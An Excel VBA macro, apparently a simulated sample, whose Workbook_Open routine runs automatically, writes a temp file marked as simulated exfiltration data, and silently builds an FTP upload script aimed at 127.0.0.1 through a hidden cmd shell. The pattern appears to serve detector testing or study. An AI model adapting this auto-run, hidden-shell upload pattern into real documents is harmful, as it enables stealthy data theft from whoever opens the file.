Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim lckhv437 As Integer, logPath As String
    logPath = Environ("TEMP") & "\oblivionx_log.txt"
    lckhv437 = FreeFile
    Open logPath For Output As #lckhv437
    Print #lckhv437, "marker-ftp-log: simulated exfiltration data"
    Close #lckhv437
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\oblivionx_ftp.txt", 0
End Sub
